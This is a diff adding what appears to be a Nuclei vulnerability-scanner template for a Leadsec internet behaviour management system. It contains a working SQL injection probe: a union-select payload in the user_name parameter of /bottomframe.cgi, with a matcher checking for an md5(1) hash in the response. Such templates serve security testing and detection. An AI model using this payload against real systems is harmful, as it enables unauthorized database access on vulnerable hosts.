@@ -1,0 +1,30 @@
+id: leadsec-ac-bottomframe-sqli
+info:
+  name: 网御星云-上网行为管理系统-sql
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-WYXY-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sqli,leadsec
+
+http:
+  - raw:
+      - |
+        GET /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'c4ca4238a0b923820dcc50')
+        condition: and
